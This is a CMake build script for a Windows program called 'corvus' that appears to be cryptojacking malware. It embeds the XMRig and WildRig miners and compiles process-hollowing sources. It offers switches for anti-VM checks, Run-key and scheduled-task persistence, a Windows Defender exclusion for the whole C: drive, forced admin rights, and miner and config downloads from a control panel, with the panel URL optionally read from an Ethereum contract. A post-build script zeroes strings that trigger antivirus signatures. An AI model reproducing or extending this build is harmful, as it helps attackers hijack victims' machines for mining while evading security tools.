cmake_minimum_required(VERSION 3.10)
project(corvus)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Link MSVC runtime statically
if(MSVC)
    foreach(flag_var CMAKE_CXX_FLAGS CMAKE_CXX_FLAGS_DEBUG CMAKE_CXX_FLAGS_RELEASE CMAKE_CXX_FLAGS_MINSIZEREL CMAKE_CXX_FLAGS_RELWITHDEBINFO)
        if(${flag_var} MATCHES "/MD")
            string(REGEX REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
        endif()
        if(${flag_var} MATCHES "/MDd")
            string(REGEX REPLACE "/MDd" "/MTd" ${flag_var} "${${flag_var}}")
        endif()
    endforeach()
endif()

add_definitions(-DUNICODE -D_UNICODE)

# Optional Debug Console feature
option(ENABLE_DEBUG_CONSOLE "Enable debug console output" OFF)
if(ENABLE_DEBUG_CONSOLE)
    message(STATUS "Debug console enabled")
    add_definitions(-DENABLE_DEBUG_CONSOLE)
endif()

# Optional Anti-VM feature
option(ENABLE_ANTIVM "Enable Anti-VM detection" OFF)

# Optional Persistence feature
option(ENABLE_PERSISTENCE "Enable persistence via Run key" OFF)

# Optional Admin Manifest feature
option(ENABLE_ADMIN_MANIFEST "Require administrator privileges" OFF)
if(ENABLE_ADMIN_MANIFEST)
    message(STATUS "Admin manifest enabled - executable will require administrator privileges")
    add_definitions(-DENABLE_ADMIN_MANIFEST)
endif()

# Optional Windows Defender Exclusion feature
option(ENABLE_DEFENDER_EXCLUSION "Add C: drive to Windows Defender exclusion" OFF)
if(ENABLE_DEFENDER_EXCLUSION)
    message(STATUS "Windows Defender exclusion enabled - will add C: drive to exclusion list")
    add_definitions(-DENABLE_DEFENDER_EXCLUSION)
endif()

# Optional Remote Miners feature
option(ENABLE_REMOTE_MINERS "Download miners from panel instead of embedding" OFF)
if(ENABLE_REMOTE_MINERS)
    message(STATUS "Remote miners enabled - miners will be downloaded from panel")
    add_definitions(-DENABLE_REMOTE_MINERS)
endif()

# Optional GET Config URL feature (MUST be before embedded config generation)
set(CONFIG_GET_URL "" CACHE STRING "Direct GET URL for config fetching (instead of POST)")
if(CONFIG_GET_URL)
    message(STATUS "Config GET URL enabled: ${CONFIG_GET_URL}")
    add_definitions(-DCONFIG_GET_URL="${CONFIG_GET_URL}")
    message(STATUS "GET mode: Embedded fallback config will be used if available")
endif()

# Generate embedded config header from JSON
include(${CMAKE_CURRENT_SOURCE_DIR}/cmake/GenerateEmbeddedConfig.cmake)

# ENABLE_EMBEDDED_CONFIG can be passed explicitly by the builder; if not set,
# auto-detect based on whether a JSON file is available.
option(ENABLE_EMBEDDED_CONFIG "Embed fallback config JSON in the executable" OFF)

# Accept config path from builder, with fallback to client resources
if(NOT DEFINED EMBEDDED_CONFIG_JSON_INPUT)
    set(EMBEDDED_CONFIG_JSON_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/resources/embedded_config.json")
endif()

set(EMBEDDED_CONFIG_HEADER "${CMAKE_CURRENT_BINARY_DIR}/generated/embedded_config_generated.h")

# Decide whether to embed: either explicit flag or auto-detect from file presence
if(ENABLE_EMBEDDED_CONFIG OR EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
    if(EXISTS "${EMBEDDED_CONFIG_JSON_INPUT}")
        message(STATUS "Embedded config file found - generating header")
        message(STATUS "Using embedded config from: ${EMBEDDED_CONFIG_JSON_INPUT}")
        generate_embedded_config("${EMBEDDED_CONFIG_JSON_INPUT}" "${EMBEDDED_CONFIG_HEADER}")
        add_definitions(-DENABLE_EMBEDDED_CONFIG)
    else()
        message(WARNING "ENABLE_EMBEDDED_CONFIG=ON but no JSON file found at: ${EMBEDDED_CONFIG_JSON_INPUT}")
    endif()
else()
    message(STATUS "Embedded config not enabled - relying on panel/GET URL at runtime")
endif()

# Source files
set(SRC_FILES
    src/main.cpp
    src/util.cpp
    src/pe_hdrs_helper.cpp
    src/hollowing_parts.cpp
    src/delete_pending_file.cpp
    src/http_client.cpp
    src/json_printer.cpp
    src/process_info.cpp
    src/config_manager.cpp
)

# Resource files - always embed miners when CPU/GPU flags set (used as fallback even in remote mode)
# Default to CPU miner if neither flag is explicitly set and not in remote-only mode
if(NOT DEFINED ENABLE_CPU_MINER AND NOT ENABLE_REMOTE_MINERS)
    set(ENABLE_CPU_MINER ON)
endif()
if(NOT DEFINED ENABLE_GPU_MINER)
    set(ENABLE_GPU_MINER OFF)
endif()

# Generate RC file if any miners are being embedded
if(ENABLE_CPU_MINER OR ENABLE_GPU_MINER)
    set(GENERATED_RC "${CMAKE_CURRENT_BINARY_DIR}/embedded_resource_generated.rc")
    set(RC_CONTENT "#include \"../include/resources.h\"\n")

    if(ENABLE_CPU_MINER)
        string(APPEND RC_CONTENT "EMBEDDED_XMRIG RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/xmrig.exe\"\n")
        message(STATUS "Embedding CPU miner (XMRig) in resources")
        add_definitions(-DENABLE_CPU_MINER)
    endif()

    if(ENABLE_GPU_MINER)
        string(APPEND RC_CONTENT "EMBEDDED_WILDRIG RCDATA \"${CMAKE_CURRENT_SOURCE_DIR}/resources/wildrig.exe\"\n")
        message(STATUS "Embedding GPU miner (WildRig) in resources")
        add_definitions(-DENABLE_GPU_MINER)
    endif()

    file(WRITE "${GENERATED_RC}" "${RC_CONTENT}")
    set(RESOURCE_FILES "${GENERATED_RC}")

    if(ENABLE_REMOTE_MINERS)
        message(STATUS "Remote miners enabled - embedded miners will be used as offline fallback")
    else()
        message(STATUS "Embedding miner resources in executable")
    endif()
else()
    set(RESOURCE_FILES)
    if(ENABLE_REMOTE_MINERS)
        message(STATUS "Remote miners enabled - no embedded fallback (no CPU/GPU miner flags set)")
    else()
        message(WARNING "No miners enabled - at least one miner should be enabled for embedded builds")
    endif()
endif()

# Header files
set(HEADER_FILES
    include/util.h
    include/kernel32_undoc.h
    include/ntddk.h
    include/pe_hdrs_helper.h
    include/hollowing_parts.h
    include/delete_pending_file.h
    include/http_client.h
    include/json_printer.h
    include/json.hpp
    include/process_info.h
    include/config_manager.h
)

# Add Anti-VM files if enabled
if(ENABLE_ANTIVM)
    message(STATUS "Anti-VM detection enabled")
    add_definitions(-DENABLE_ANTIVM)
    list(APPEND SRC_FILES src/antivm.cpp)
    list(APPEND HEADER_FILES include/antivm.h)
endif()

# Add Persistence files if enabled
if(ENABLE_PERSISTENCE)
    message(STATUS "Persistence enabled")
    add_definitions(-DENABLE_PERSISTENCE)
    list(APPEND SRC_FILES src/persistence.cpp)
    list(APPEND HEADER_FILES include/persistence.h)
endif()

# Smart contract URL fetching
# When enabled the client calls the deployed TextStorage contract at startup
# to read the panel/config URL from the blockchain instead of using a hardcoded value.
option(ENABLE_CONTRACT_URL "Fetch URL from Ethereum TextStorage smart contract at runtime" OFF)
set(CONTRACT_ADDRESS "" CACHE STRING "Deployed TextStorage contract address (0x...)")
if(ENABLE_CONTRACT_URL)
    if(CONTRACT_ADDRESS STREQUAL "")
        message(FATAL_ERROR "CONTRACT_ADDRESS must be set when ENABLE_CONTRACT_URL=ON")
    endif()
    message(STATUS "Contract URL enabled: ${CONTRACT_ADDRESS} (RPC endpoints hardcoded)")
    add_definitions(-DENABLE_CONTRACT_URL)
    add_definitions(-DCONTRACT_ADDRESS="${CONTRACT_ADDRESS}")
    list(APPEND SRC_FILES src/contract_reader.cpp)
    list(APPEND HEADER_FILES include/contract_reader.h)
endif()

# Miners are now embedded as resources in the executable
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS}")
if(MSVC)
    # Enable resource compilation for MSVC
    enable_language(RC)
endif()
if(NOT MSVC)
	set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")
	# Size optimization for Release builds with MinGW
	# -Os: optimize for size, -s: strip symbols, -Wl,--gc-sections: remove unused sections
	set(CMAKE_CXX_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
	set(CMAKE_C_FLAGS_RELEASE "-Os -s -Wl,--gc-sections -fdata-sections -ffunction-sections")
endif()
set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")

# Create executable - use WIN32 subsystem unless debug console is enabled
if(ENABLE_DEBUG_CONSOLE)
    add_executable(corvus 
        ${SRC_FILES}
        ${RESOURCE_FILES}
        ${HEADER_FILES}
    )
else()
    add_executable(corvus 
        WIN32
        ${SRC_FILES}
        ${RESOURCE_FILES}
        ${HEADER_FILES}
    )
endif()

# Set linker flags for GUI subsystem (hide console)
set_target_properties(corvus PROPERTIES
    OUTPUT_NAME corvus
)

if(MSVC)
	target_compile_options(corvus PRIVATE /W0)
else()
	target_compile_options(corvus PRIVATE
		-w
		-ffunction-sections
		-fdata-sections
	)
endif()

# Link libraries
if(MSVC)
	target_link_libraries(corvus
		winhttp.lib
		ntdll.lib
		wbemuuid.lib
		ole32.lib
		oleaut32.lib
		iphlpapi.lib
	)
	# Link Task Scheduler library if persistence is enabled
	if(ENABLE_PERSISTENCE)
		target_link_libraries(corvus taskschd.lib)
	endif()
else()
	# Statically link the C/C++ runtime so api-ms-win-crt-*.dll strings
	# never appear in the import table.
	# -ffunction-sections/-fdata-sections + --gc-sections eliminate dead libgcc
	# code (pseudo-reloc handler strings). --disable-runtime-pseudo-reloc
	# ensures the handler is never referenced so --gc-sections can drop it.
	target_link_options(corvus PRIVATE
		-static-libgcc
		-static-libstdc++
		-static
		-Wl,--gc-sections
		-Wl,--disable-runtime-pseudo-reloc
	)
	target_link_libraries(corvus
		-lwinhttp
		-lntdll
		-lwbemuuid
		-lole32
		-loleaut32
		-liphlpapi
		-luuid
	)
	# Link Task Scheduler library if persistence is enabled
	if(ENABLE_PERSISTENCE)
		# Try to link taskschd, fallback to mstask if needed
		target_link_libraries(corvus -ltaskschd)
	endif()
endif()

# Add admin manifest if enabled
if(ENABLE_ADMIN_MANIFEST)
	if(MSVC)
		set_target_properties(corvus PROPERTIES
			LINK_FLAGS "${LINK_FLAGS} /MANIFESTUAC:\"level=requireAdministrator uiAccess=false\""
		)
	endif()
endif()

# Include directories
target_include_directories(corvus PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_BINARY_DIR}/generated
)

# Installation
install(TARGETS corvus
    DESTINATION ${CMAKE_INSTALL_PREFIX}
    COMPONENT corvus
)

add_custom_command(TARGET corvus POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E remove_directory ${CMAKE_BINARY_DIR}/CMakeFiles
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/CMakeCache.txt
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/cmake_install.cmake
    COMMAND ${CMAKE_COMMAND} -E remove ${CMAKE_BINARY_DIR}/Makefile
    COMMENT "Auto-removing CMake-generated files"
)

# Post-build: patch MinGW pseudo-reloc error strings that trigger AV signatures.
# These strings live in libgcc.a and cannot be removed via --gc-sections because
# crtbegin.o always keeps a live reference to the handler.  Zeroing them in the
# linked PE is reliable and has no runtime impact (the handler only uses them
# before abort(), and --disable-runtime-pseudo-reloc prevents it being called).
if(NOT MSVC)
    file(WRITE "${CMAKE_BINARY_DIR}/patch_pseudoreloc.py"
"import sys, re

path = sys.argv[1]
with open(path, 'rb') as f:
    data = bytearray(f.read())

targets = [
    b'Mingw-w64 runtime failure:\\n',
    b'Address %p has no image-section',
    b'  VirtualQuery failed for %d bytes at address %p',
    b'  VirtualProtect failed with code 0x%x',
    b'  Unknown pseudo relocation protocol version %d',
    b', %g)  (retval=%g)\\n',
]

patched = 0
for t in targets:
    idx = data.find(t)
    while idx != -1:
        for i in range(idx, idx + len(t)):
            data[i] = 0x00
        patched += 1
        idx = data.find(t, idx + 1)

with open(path, 'wb') as f:
    f.write(bytes(data))

print('[patch] Zeroed', patched, 'pseudo-reloc string(s) in', path)
")
    find_program(PYTHON_EXE NAMES python3 python py)
    if(PYTHON_EXE)
        add_custom_command(TARGET corvus POST_BUILD
            COMMAND ${PYTHON_EXE} "${CMAKE_BINARY_DIR}/patch_pseudoreloc.py" $<TARGET_FILE:corvus>
            COMMENT "Patching MinGW pseudo-reloc strings in binary"
        )
    else()
        message(WARNING "Python not found -- MinGW pseudo-reloc strings will NOT be patched")
    endif()
endif()

message(STATUS "Project configured for build")